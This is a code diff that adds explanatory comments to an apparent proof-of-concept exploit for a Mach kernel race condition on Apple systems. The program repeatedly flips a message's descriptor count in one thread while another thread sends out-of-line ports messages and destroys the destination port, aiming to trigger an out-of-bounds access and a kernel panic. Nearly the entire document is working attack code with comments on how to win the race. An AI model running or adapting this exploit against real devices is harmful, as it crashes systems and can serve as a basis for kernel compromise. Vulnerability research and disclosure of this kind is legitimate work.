@@ -45,6 +45,9 @@ mach_port_t dest, target;
 
 void race_thread() {
     while (1) {
+        // change the descriptor count back and forth
+        // eventually the race will work just right so we get this order of actions:
+        // count = N_DESC -> first copyin -> count = N_CORRUPTED -> second copyin
         msg->body.msgh_descriptor_count = N_CORRUPTED;
         msg->body.msgh_descriptor_count = N_DESC;
     }
@@ -52,12 +55,16 @@ void race_thread() {
 
 void main_thread() {
     while (1) {
+        // create a mach port where we'll send the message
         dest = new_mach_port();
-        
+    
+        // send
         msg->hdr.msgh_remote_port = dest;
         int ret = mach_msg(&msg->hdr, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg->hdr.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
         if (ret) printf("error: %s\n", mach_error_string(ret));
-        
+    
+        // destroy the port to trigger the panic
+        // note: don't receieve the message, that'll override ikm_header and stop the crash from happening
         printf("Destroying...\n");
         mach_port_destroy(mach_task_self(), dest);
         printf("Dead yet?\n");
@@ -67,6 +74,7 @@ void main_thread() {
 void poc() {
     printf("Crashing kernel...\n");
     
+    // create a dummy port to send with the message
     target = new_mach_port();
     
     mach_port_t* ports = malloc(sizeof(mach_port_t) * N_PORTS);
@@ -74,14 +82,18 @@ void poc() {
         ports[i] = target;
     }
     
+    // set up an OOL ports message
+    // make the size N_CORRUPTED because it's bigger, otherwise the message won't send and return an error.
+    // this will make the allocation bigger but we don't care about tha as the out of bounds will be done to the left of the buffer, not to the right
     msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg) + sizeof(mach_msg_ool_ports_descriptor_t) * N_CORRUPTED);
     
     msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
     msg->hdr.msgh_size = (mach_msg_size_t)(sizeof(struct ool_msg) + sizeof(mach_msg_ool_ports_descriptor_t) * N_CORRUPTED);
-    msg->hdr.msgh_remote_port = 0;
+    msg->hdr.msgh_remote_port = 0;// dest[i];
     msg->hdr.msgh_local_port = MACH_PORT_NULL;
     msg->hdr.msgh_id = 0x41414141;
     
+    // set the initial (smaller) descriptor count
     msg->body.msgh_descriptor_count = N_DESC;
     
     for (int i = 0; i < N_DESC; i++) {
@@ -93,6 +105,7 @@ void poc() {
         msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
     }
     
+    // start the threads
     pthread_t thread, thread2;
     pthread_create(&thread, NULL, (void*)race_thread, NULL);
     pthread_create(&thread2, NULL, (void*)main_thread, NULL);
